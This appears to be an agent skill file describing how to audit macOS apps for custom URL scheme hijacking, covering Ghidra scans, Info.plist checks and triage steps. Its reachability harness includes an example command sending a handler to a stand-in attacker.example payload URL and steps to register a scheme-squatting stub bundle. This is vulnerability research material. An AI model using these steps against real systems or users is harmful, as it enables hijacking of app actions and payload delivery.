---
name: offensive-macos-hunt-url-scheme-hijack
description: >-
  Use when auditing macOS apps for custom URL scheme registration and inbound
  URL handling: bundles that claim a scheme via CFBundleURLTypes, dispatchers
  that trust URL host/query without validation, schemes that overlap with
  other apps, and apps that take privileged actions in
  application:openURL:. Fires on "url scheme hijack", "openURL handler audit",
  "cfbundleurlschemes", and "deep link bypass".
folder: offensive-macos-hunt-url-scheme-hijack
source: skillz-wave6
trigger_phrases:
  - "url scheme hijack"
  - "openURL handler audit"
  - "cfbundleurlschemes"
  - "deep link bypass"
---

# Hunt: Custom URL Scheme Hijack / Open-URL Confused Deputy

> **Channel boundary:** `REPO_MODE=analysis`. Root-cause analysis, lab
> reproduction, defensive mapping, and reporting guidance only.

## When To Use

- The target's `Info.plist` declares `CFBundleURLTypes` with one or more `CFBundleURLSchemes` entries.
- The target implements `application:openURL:` / `application:openURLs:` / `handleURL:` / `getUrl:withReplyEvent:`.
- The target is invoked indirectly: links in email, documents, web pages, or other apps drive it via `open <url>` or `LSOpen*`.
- A privileged installer or helper takes a URL parameter from configuration or command line and routes it through `CFURLCreateWithString` -> action.

## Lab Topology — Where To Run This

| Step | Surface | How |
|------|---------|-----|
| Static script sweep | lab host via Cursor | `ghidra-mcp` + `~/ghidra-scripts/scan_url_scheme_handlers.py` |
| Bundle-side scheme audit | workstation | `defaults read /Applications/<App>.app/Contents/Info.plist CFBundleURLTypes` |
| LaunchServices state | lab host | `lsregister -dump \| grep -A 4 <bundle-id>` |
| Handler-impl decompile | lab host via Cursor | `decomp.function` on each tier-B `open_url_handler_impl` |
| Reachability harness | crash-test | `open '<scheme>://...'` from a low-privilege user; observe app behavior |
| Evidence record | findings repo | TSVs + log captures under `artifacts/`, hash-pinned |

## Vulnerability Class Definition

A URL scheme handler is a confused-deputy primitive: an external party (web page, document, email) drives an *internal* action in the registered app. The bug class is the dispatcher trusting the URL too much.

Three shapes:

1. **Trusted parameter passing.** The dispatcher reads a URL query parameter (file path, server URL, command name, login token) and acts on it without authorization or validation. Classic example: an updater handler that takes `?url=https://attacker.example/payload` and downloads from it.
2. **Scheme squatting.** Multiple apps claim the same scheme; LaunchServices picks one. An attacker who installs a bundle claiming a privileged scheme can intercept URLs intended for the legitimate app.
3. **Sandbox-equivalent capability via URL.** Sandboxed code uses `open <url>` or `[NSWorkspace openURL:]` to ask another app to do something the sandboxed code itself cannot. If that other app's handler does not validate the requesting party, sandbox is effectively transparent.

The strong invariant: every privileged action gated by an inbound URL must verify the caller (via responsible-process attribution) and validate the URL's host / path / query against an explicit allowlist.

## Anchor Pattern

From `scan_url_scheme_handlers.py`:

- **Strong**: tier-A `ls_set_default_handler_callsite` with `scheme=` recovered. The app registered itself for that scheme. Pair with the `Info.plist` to know if it is the *default* or just a handler.
- **Strong**: tier-B `open_url_handler_impl` rows. Each is a function the system calls when a URL arrives. Decompile every one.
- **Strong**: tier-C `url_scheme_string` rows where the scheme is unusual (vendor-specific, single word, conflicts with a well-known iOS scheme). Schemes like `app-config://` or `update://` are louder signals than `https://` or `http://`.
- **Medium**: tier-A `cfurl_create_with_string_callsite` with `url=` recovered. The app constructs URLs at runtime; check who controls the construction inputs.
- **Weak**: tier-C `cfbundle_url_key_string` rows alone. Means the binary references the URL-types plist machinery; could be reading it for any reason.

## Harness Invocation

1. Open the target:
   ```text
   program.open(path="/Applications/<App>.app/Contents/MacOS/<binary>",
                project_location="/Users/<remote-user>/ghidra-projects",
                project_name="urlscheme-<target>", read_only=true, update_analysis=true)
   ```

2. Run the scan:
   ```text
   ghidra.script(session_id="<session>",
                 path="/Users/<remote-user>/ghidra-scripts/scan_url_scheme_handlers.py",
                 script_args=[])
   ```

3. Read the bundle-side declaration:
   ```bash
   plutil -p /Applications/<App>.app/Contents/Info.plist \
     | grep -A 8 CFBundleURLTypes
   ```

4. For each tier-B `open_url_handler_impl` row, decompile and trace:
   ```text
   inbound URL
     -> scheme switch        (which schemes does the dispatcher accept?)
       -> host/path/query parse
         -> action selection (download | exec | login | spawn)
           -> destination    (which file / network / process?)
             -> validation   (allowlist | code-signed origin | none)
   ```

5. Build a (scheme, action, validation) inventory. Anywhere the validation step is "none" or weaker than the action's privilege, you have a candidate.

## Reachability Harness

```bash
# Drive the handler from a low-privilege user; observe.
open 'examplescheme://action?url=https://attacker.example/'

# Capture what the app does:
log stream --style compact \
  --predicate 'process == "<App>" AND eventMessage CONTAINS "openURL"'
```

For scheme squatting, register a stub bundle claiming the same scheme on a crash-test VM:

```bash
defaults write com.example.stub CFBundleURLTypes \
  -array '{ CFBundleURLName = stub; CFBundleURLSchemes = ( examplescheme ); }'
# Place a minimal app bundle at /Applications/Stub.app and let LaunchServices index it.
lsregister -kill -r -domain local -domain user
```

Snapshot first. LaunchServices state is fiddly to clean up.

## Triage Workflow

1. Enumerate every scheme the bundle claims (from `Info.plist`) and every scheme it constructs URLs for (from `cfurl_create_with_string_callsite`).
2. For each scheme, identify the dispatcher in `application:openURL:` / `application:openURLs:`.
3. Trace each privileged action that depends on URL contents.
4. Promote to `escalated` only when an externally driven URL can reach a privileged action without validation.
5. Confirm with the reachability harness on the crash-test VM.

## Pitfalls

- **LaunchServices is a black box.** Which app handles a scheme depends on `lsregister` state that is not solely determined by Info.plist; it tracks last-installed-wins and user choices. A scheme-squatting test on one machine may not reproduce on another with different LS history.
- **`open` is not the only entry point.** `NSWorkspace openURL:`, `LSOpenCFURLRef`, `LSOpenFromURLSpec`, `[NSAppleEventManager getURL:]` are all paths into the handler. Check all of them.
- **App Sandbox does not stop URL dispatch.** A sandboxed origin app can still invoke `open <url>`; the sandbox controls *what the origin app does*, not *what other apps do on its behalf*.
- **Universal Links / Associated Domains** are a different code path on macOS 10.15+ and use HTTPS. Custom schemes still exist and still ship in many apps.
- **Quoting and encoding bugs.** A handler that splits the URL string by `&` or unquotes with `stringByRemovingPercentEncoding` early may be vulnerable to encoding tricks the URL parser library would not have allowed.

## Known Public Anchors

- Wojciech Reguła's research on macOS / iOS URL schemes (Securitum / SecuRing posts).
- Multiple iOS-derived URL-handler bugs that ported to Catalyst / Mac apps as those apps shipped on macOS.
- Vendor-specific URL handler bugs disclosed by individual researchers across 2020–2024.

## See Also

- `Skills/offensive-macos-family-tcc-heavy-apps/SKILL.md`
- `Skills/offensive-macos-electron-surface-pack/SKILL.md`
- `Skills/offensive-macos-hunt-private-framework-hijack/SKILL.md`
- `Skills/offensive-macos-hunt-wrong-door/SKILL.md`
- `ghidra-scripts/scan_url_scheme_handlers.py`
